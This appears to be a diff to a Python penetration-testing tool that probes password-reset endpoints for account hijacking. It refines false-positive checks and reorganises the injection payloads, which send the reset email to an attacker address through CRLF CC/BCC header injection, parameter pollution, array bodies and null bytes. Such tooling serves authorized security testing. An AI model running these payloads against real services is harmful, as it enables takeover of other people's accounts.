@@ -21,6 +21,33 @@ from utils.utils import (
 )
 import urllib.parse
 import uuid
+from utils import live
+
+
+def _is_error_echo(resp_text, email):
+    """
+    True when `email` only appears inside a JSON/GraphQL error message — i.e. the
+    server rejected the input and echoed it back in an error (e.g. GraphQL
+    "String cannot represent a list ["victim","attacker"]"). That is NOT a real
+    reflection of a processed value, so counting it as a hijack is a false positive.
+    """
+    if not resp_text or not email:
+        return False
+    try:
+        d = json.loads(resp_text)
+    except Exception:
+        return False
+    if not isinstance(d, dict):
+        return False
+    errs = d.get("errors")
+    if not errs:
+        return False
+    el = email.lower()
+    in_errors = el in json.dumps(errs).lower()
+    data_blob = json.dumps(d.get("data")) if d.get("data") is not None else ""
+    in_data = el in data_blob.lower()
+    # echoed inside errors but nowhere in the real data → just an error echo
+    return in_errors and not in_data
 
 
 def inject_into_email_param(body, payload):
@@ -161,7 +188,16 @@ def get_email_param_names(body):
     for key, _ in matches:
         param_names.add(key)
 
-    return list(param_names)
+    # The raw-fallback regex sees the URL-encoded key (forgot_password%5Bemail%5D)
+    # while parse_qs already decoded it (forgot_password[email]) → the same param
+    # counted twice, which then makes the caller think "multiple email params,
+    # ambiguous". Normalise by URL-decoding and dedup so they collapse to one.
+    normalized = {}
+    for name in param_names:
+        key = urllib.parse.unquote(name)
+        # keep the decoded form as canonical
+        normalized.setdefault(key, key)
+    return list(normalized.values())
 
 
 def _extract_email_from_body(body):
@@ -283,6 +319,10 @@ def body_transformation(url, human, parsed_req, baseline, interact, email, proxy
     uri = f"{scheme}://{original_host}{path}"
     proxies = {"http": proxy, "https": proxy} if proxy else None
 
+    if not email or "@" not in email:
+        print(f"  {Colors.YELLOW}[!] -e/--email (attacker email) required for hijack payloads — skipped{Colors.RESET}")
+        return
+
     if not body:
         print(f"  {Colors.YELLOW}[!] No body to transform{Colors.RESET}")
         return
@@ -383,9 +423,9 @@ def body_transformation(url, human, parsed_req, baseline, interact, email, proxy
 
     elif current_ct == "form":
         arr_body = f"{param_mail}[]={urllib.parse.quote(victim_email)}&{param_mail}[]={urllib.parse.quote(email)}"
+        other_params = []
         try:
             parsed = urllib.parse.parse_qs(body, keep_blank_values=True)
-            other_params = []
             for k, vals in parsed.items():
                 if k != param_mail:
                     for v in vals:
@@ -611,11 +651,15 @@ def body_transformation(url, human, parsed_req, baseline, interact, email, proxy
     # ─── Send standard payloads ──────────────────────────────────────────────
     _bt_findings: dict = {}
     _bt_positive = []
+    # Success strings the endpoint ALREADY returns normally — flagging these is a
+    # false positive, so we only report indicators that are new vs the baseline.
+    _baseline_lower = (baseline.get("body") or "").lower()
 
     for p_body, p_headers, desc in payloads:
         body_short = p_body[:100] + ("..." if len(p_body) > 100 else "")
 
         try:
+            live.testing(f"body-transform {desc}")
             human_time(human)
             resp = requests.request(
                 method=method, url=uri, headers=p_headers,
@@ -632,15 +676,20 @@ def body_transformation(url, human, parsed_req, baseline, interact, email, proxy
                 _bt_findings.setdefault(" | ".join(_tags), []).append(desc)
 
             if email in resp.text:
-                _bt_positive.append(f"[+] {email} reflected in body → {desc}")
+                if _is_error_echo(resp.text, email):
+                    _bt_positive.append(f"[i] {email} echoed only in an error message → {desc} (not processed — likely a GraphQL/type error, not a hijack)")
+                else:
+                    _bt_positive.append(f"[+] {email} reflected in body → {desc}")
             if email in str(resp.headers):
                 _bt_positive.append(f"[+] {email} reflected in headers → {desc}")
 
             resp_lower = resp.text.lower()
             success_indicators = ["success", "email sent", "password reset", "reset link", "check your email", "token"]
             for indicator in success_indicators:
-                if indicator in resp_lower and resp.status_code in (200, 201, 202, 204):
-                    _bt_positive.append(f"[+] '{indicator}' → {desc} | {body_short}")
+                # only if it's NEW vs baseline (baseline already says "check your email")
+                if (indicator in resp_lower and indicator not in _baseline_lower
+                        and resp.status_code in (200, 201, 202, 204)):
+                    _bt_positive.append(f"[+] new indicator '{indicator}' (absent from baseline) → {desc} | {body_short}")
                     break
 
         except requests.RequestException as e:
@@ -700,11 +749,13 @@ def body_transformation(url, human, parsed_req, baseline, interact, email, proxy
     except:
         pass
 
+    _baseline_lower = (baseline.get("body") or "").lower()
     for p_body, p_headers, p_uri, desc in hpp_cases:
         qs_short = ("..." + p_uri[-80:]) if len(p_uri) > 83 else p_uri
         body_short = p_body[:80] + ("..." if len(p_body) > 80 else "")
         payload_tag = f"[{desc}] {qs_short}"
         try:
+            live.testing(f"hpp {desc}")
             human_time(human)
             resp = requests.request(
                 method=method, url=p_uri, headers=p_headers,
@@ -717,14 +768,18 @@ def body_transformation(url, human, parsed_req, baseline, interact, email, proxy
             if abs(len(resp.text) - baseline['body_length']) > 50 and resp.status_code not in [400, 403]:
                 print(f"{Colors.YELLOW}   └── [{baseline['body_length']}b > {len(resp.text)}b] | PAYLOAD: {payload_tag}")
             if email in resp.text:
-                print(f"{Colors.GREEN}   └── [+] {email} reflected in body | PAYLOAD: {payload_tag}{Colors.RESET}")
+                if _is_error_echo(resp.text, email):
+                    print(f"{Colors.CYAN}   └── [i] {email} echoed only in an error message | PAYLOAD: {payload_tag} (not processed — likely a type/validation error, not a hijack){Colors.RESET}")
+                else:
+                    print(f"{Colors.GREEN}   └── [+] {email} reflected in body | PAYLOAD: {payload_tag}{Colors.RESET}")
             if email in str(resp.headers):
                 print(f"{Colors.GREEN}   └── [+] {email} reflected in headers | PAYLOAD: {payload_tag}{Colors.RESET}")
 
             resp_lower = resp.text.lower()
             for indicator in ["success", "email sent", "password reset", "reset link", "check your email", "token"]:
-                if indicator in resp_lower and resp.status_code in (200, 201, 202, 204):
-                    print(f"{Colors.GREEN}   └── [+] '{indicator}' → {desc}{Colors.RESET}")
+                if (indicator in resp_lower and indicator not in _baseline_lower
+                        and resp.status_code in (200, 201, 202, 204)):
+                    print(f"{Colors.GREEN}   └── [+] new indicator '{indicator}' (absent from baseline) → {desc}{Colors.RESET}")
                     print(f"{Colors.GREEN}       {qs_short}{Colors.RESET}")
                     break
 
@@ -746,10 +801,38 @@ def data_pollution(url, human, parsed_req, baseline, interact, email, proxy=None
     uri = f"{scheme}://{original_host}{path}"
     proxies = {"http": proxy, "https": proxy} if proxy else None
 
+    if not email or "@" not in email:
+        print(f"  {Colors.YELLOW}[!] -e/--email (attacker email) required — data pollution skipped{Colors.RESET}")
+        return
+
+    content_type = detect_content_type(headers)
+
     gepn = get_email_param_names(body)
     if len(gepn) == 1:
         param_mail = gepn[0]
-        email_payloads = [
+
+        # Payloads that stay meaningful once appended INSIDE an email string value
+        # (real control chars / multi-recipient separators) — valid for any body,
+        # including JSON, because they do not rely on URL-decoding.
+        common_payloads = [
+            f",{email}",
+            f";{email}",
+            f" {email}",
+            f"|{email}",
+            f"@{email}",
+            f"\r\nCC:{email}",
+            f"\r\nTo:{email}",
+            f"\r\nBCC:{email}",
+            f"<{email}>",
+            f"\"{email}\"",
+            f"'{email}'",
+            f"{{{email}}}",
+            f"\x00{email}",
+        ]
+
+        # HPP param-injection and %-encoded CRLF: only work where the server
+        # URL-decodes the body (x-www-form-urlencoded), NOT in JSON string values.
+        form_only_payloads = [
             f"&{param_mail}={email}",
             f"%20{param_mail}={email}",
             f"|{param_mail}={email}",
@@ -758,11 +841,7 @@ def data_pollution(url, human, parsed_req, baseline, interact, email, proxy=None
             f"+{param_mail}={email}",
             f"&{email}",
             f"%20{email}",
-            f"|{email}",
-            f",{email}",
-            f";{email}",
             f"+{email}",
-            f"@{email}",
             f"%0ACc:{email}",
             f"%0ABcc:{email}",
             f"%0D%0ACc:{email}",
@@ -772,26 +851,26 @@ def data_pollution(url, human, parsed_req, baseline, interact, email, proxy=None
             f"%0d%0aCC:{email}",
             f"%0d%0aBCC:{email}",
             f"%0d%0aTo:{email}",
-            f"\r\nCC:{email}",
-            f"\r\nTo:{email}",
             f"%E5%98%8A%E9%8A%8DCC:{email}",
             f"%0a%20CC:{email}",
-            f"<{email}>",
-            f"\"{email}\"",
-            f"'{email}'",
             f"\\n{email}",
             f"\\r{email}",
-            f"{{{email}}}",
             f"%00{email}",
-            f"\x00{email}",
             f"%40{email}",
             f"%2540{email}",
             f"%2C{email}",
             f"%3B{email}",
         ]
+
+        email_payloads = common_payloads + (form_only_payloads if content_type == "form" else [])
+        if content_type != "form":
+            print(f"  {Colors.CYAN}[~] Non-form body ({content_type}) — URL-encoded/HPP payloads skipped, "
+                  f"{len(common_payloads)} raw-injection payloads kept{Colors.RESET}")
+
         if re.search(EMAIL_REGEX, body, re.IGNORECASE):
             _dp_findings: dict = {}
             for ep in email_payloads:
+                live.testing(f"data-pollution {ep}")
                 human_time(human)
                 body_injected = inject_into_email_param(body, ep)
                 try:
@@ -818,6 +897,10 @@ def data_pollution(url, human, parsed_req, baseline, interact, email, proxy=None
                         print(f"{Colors.YELLOW}   └── [{tag}] | PAYLOAD: {p}{Colors.RESET}")
             if not _dp_findings:
                 print(f"  {Colors.CYAN}[~] No anomalies — server returns consistent response for all payloads{Colors.RESET}")
+    elif len(gepn) == 0:
+        print(f"  {Colors.YELLOW}[!] No email parameter identified in body — data pollution skipped{Colors.RESET}")
+    else:
+        print(f"  {Colors.YELLOW}[!] Multiple email params {gepn} — ambiguous, data pollution skipped{Colors.RESET}")
 
 
 def parameters_pollution(url, human, parsed_req, baseline, interact, email, proxy=None):
